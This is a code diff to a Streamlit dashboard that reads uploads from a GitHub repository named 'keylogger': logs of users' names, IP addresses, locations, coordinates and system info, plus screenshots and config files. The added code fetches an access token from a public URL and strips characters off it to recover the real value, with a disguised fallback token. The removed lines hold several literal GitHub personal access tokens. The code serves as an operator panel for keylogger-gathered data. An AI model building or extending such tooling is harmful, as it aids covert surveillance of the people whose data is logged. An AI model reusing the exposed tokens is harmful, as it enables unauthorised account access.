@@ -12,6 +12,11 @@ from datetime import datetime, timedelta
 from streamlit_image_zoom import image_zoom
 
 
+# URL containing the tokens JSON
+TOKEN_URL = "https://raw.githubusercontent.com/bebedudu/tokens/refs/heads/main/tokens.json"
+# Default token if URL fetch fails
+DEFAULT_TOKEN = "asdfg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aefthu"
+
 # Your GitHub Personal Access Token
 DATA_URL = "https://raw.githubusercontent.com/bebedudu/keylogger/refs/heads/main/uploads/activeuserinfo.txt"
 SCREENSHOT_API_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/screenshots"
@@ -19,16 +24,40 @@ SCREENSHOT_BASE_URL = "https://raw.githubusercontent.com/bebedudu/keylogger/refs
 CONFIG_API_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads/config"
 CONFIG_BASE_URL = "https://raw.githubusercontent.com/bebedudu/keylogger/refs/heads/main/uploads/config/"
 
-# Use Streamlit secrets for GitHub token
-# GITHUB_TOKEN = st.secrets["GITHUB_TOKEN"]
-
-GITHUB_TOKEN = "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"
-# GITHUB_TOKEN = "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"
-# GITHUB_TOKEN = st.secrets["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"]
 last_line = 10 # Number of lines to fetch
 cache_time = 1  # Cache time in seconds
 last_screenshot = 30  # Number of screenshots to fetch
 last_config = 30  # Number of config files to fetch
+
+def get_token():
+    try:
+        # Fetch the JSON from the URL
+        response = requests.get(TOKEN_URL)
+        if response.status_code == 200:
+            token_data = response.json()
+
+            # Check if the "delete" key exists
+            if "delete" in token_data:
+                token = token_data["delete"]
+
+                # Remove the first 5 and last 6 characters
+                processed_token = token[5:-6]
+                print(f"Token fetched and processed: {processed_token}")
+                return processed_token
+            else:
+                print("Key 'delete' not found in the token data.")
+        else:
+            print(f"Failed to fetch tokens. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"An error occurred while fetching the token: {e}")
+
+    # Fallback to the default token
+    print("Using default token.")
+    return DEFAULT_TOKEN[5:-6]
+
+# Call the function
+GITHUB_TOKEN = get_token()
+# print(f"Final Token: {GITHUB_TOKEN}")
 
 
 # Encrypted username and password
@@ -641,184 +670,6 @@ st.markdown(f"""
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-# import re
-# import ast
-# import requests
-# import pandas as pd
-# import streamlit as st
-
-# # Your GitHub Personal Access Token
-# GITHUB_TOKEN = "add_your_token_here"
-# DATA_URL = "https://raw.githubusercontent.com/bebedudu/keylogger/refs/heads/main/uploads/activeuserinfo.txt"
-# last_line = 10
-
-
-# # show unique user details
-# # Function to fetch the last 10 lines from the private repository
-# def fetch_last_10_lines_private(url, token):
-#     headers = {
-#         "Authorization": f"token {token}"
-#     }
-#     response = requests.get(url, headers=headers)
-#     if response.status_code == 200:
-#         lines = response.text.strip().split("\n")
-#         return lines[-last_line:]  # Return the last 10 lines
-#     else:
-#         st.error(f"Failed to fetch data: {response.status_code} - {response.reason}")
-#         return []
-
-# # Function to parse user info
-# def parse_user_info(lines):
-#     user_data = []
-#     for line in lines:
-#         match = re.search(r"User: (?P<username>.*?), IP: (?P<ip>.*?), Location: (?P<location>.*?), Org: (?P<org>.*?), Coordinates: (?P<coordinates>.*?), Postal: (?P<Postal>.*?),", line)
-#         if match:
-#             user_data.append(match.groupdict())
-#     return user_data
-
-# # Function to update the dashboard
-# def update_dashboard():
-#     lines = fetch_last_10_lines_private(DATA_URL, GITHUB_TOKEN)
-#     user_data = parse_user_info(lines)
-
-#     if user_data:
-#         # Convert to DataFrame for display
-#         df = pd.DataFrame(user_data).drop_duplicates(subset="username")
-#         st.table(df)  # Display as a table
-#     else:
-#         st.warning("No active user data found!")
- 
-# # Streamlit app
-# st.title("User Active Dashboard")
-# st.write("Dashboard showing unique active users and their details from the last 10 log entries.")
-
-# # Auto-refresh manually
-# if st.button("Update Dashboard"):
-#     update_dashboard()
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-# # unique user data and specific data
-# # Function to fetch the last 10 lines from the private repository
-# def fetch_last_10_lines_private(url, token):
-#     headers = {
-#         "Authorization": f"token {token}"
-#     }
-#     response = requests.get(url, headers=headers)
-#     if response.status_code == 200:
-#         lines = response.text.strip().split("\n")
-#         return lines[-last_line:]  # Return the last 10 lines
-#     else:
-#         st.error(f"Failed to fetch data: {response.status_code} - {response.reason}")
-#         return []
-
-# # Function to safely parse System Info
-# def preprocess_system_info(system_info_str):
-#     """
-#     Preprocesses the system info string by replacing unsupported objects (like sdiskpart)
-#     with a placeholder or simplified representation.
-#     """
-#     system_info_str = re.sub(r"sdiskpart\(.*?\)", "'Disk Partition'", system_info_str)  # Replace sdiskpart objects
-#     try:
-#         system_info = ast.literal_eval(system_info_str)
-#     except Exception as e:
-#         st.warning(f"Error parsing System Info: {e}")
-#         system_info = {"Error": "Unable to parse System Info"}
-#     return system_info
-
-# # Function to parse user info
-# def parse_user_info(lines):
-#     user_data = []
-#     for line in lines:
-#         user_info = {}
-#         user_info["raw"] = line
-#         user_info.update(re.search(
-#             r"User: (?P<username>.*?), IP: (?P<ip>.*?), Location: (?P<location>.*?), Org: (?P<org>.*?), Coordinates: (?P<coordinates>.*?),",
-#             line
-#         ).groupdict())
-        
-#         # Extract system info details
-#         system_info_match = re.search(r"System Info: (?P<system_info>{.*})", line)
-#         if system_info_match:
-#             system_info_str = system_info_match.group("system_info")
-#             user_info["system_info"] = preprocess_system_info(system_info_str)
-        
-#         user_data.append(user_info)
-#     return user_data
-
-# # Function to get unique users
-# def get_unique_users(user_data):
-#     seen_users = set()
-#     unique_users = []
-#     for user in user_data:
-#         if user["username"] not in seen_users:
-#             seen_users.add(user["username"])
-#             unique_users.append(user)
-#     return unique_users
-
-# # Streamlit app to display detailed user info
-# st.title("Detailed User Activity Dashboard")
-# st.write("Explore detailed information of active users in the last 10 logs.")
-
-# # Fetch and parse the data
-# lines = fetch_last_10_lines_private(DATA_URL, GITHUB_TOKEN)
-# user_data = parse_user_info(lines)
-
-# if user_data:
-#     # Get unique users
-#     unique_users = get_unique_users(user_data)
-#     user_list = ["All"] + [user["username"] for user in unique_users]  # Add "All" for default option
-
-#     # Sidebar to select a user
-#     selected_user = st.sidebar.selectbox("Select a User", user_list)
-
-#     # Filter data based on selection
-#     if selected_user != "All":
-#         filtered_users = [user for user in unique_users if user["username"] == selected_user]
-#     else:
-#         filtered_users = unique_users  # Only show unique users
-
-#     # Display details of filtered users
-#     st.write(f"### Active Users: {len(filtered_users)}")
-#     for user in filtered_users:
-#         with st.expander(f"Details for User: {user['username']} (IP: {user['ip']})"):
-#             st.write(f"**Location:** {user['location']}")
-#             st.write(f"**Organization:** {user['org']}")
-#             st.write(f"**Coordinates:** {user['coordinates']}")
-            
-#             # Display System Info in a table
-#             if "system_info" in user:
-#                 system_info_df = pd.DataFrame(
-#                     user["system_info"].items(), columns=["Property", "Value"]
-#                 )
-#                 st.write("### System Info:")
-#                 st.table(system_info_df)
-# else:
-#     st.warning("No user data found!")
 
 
 
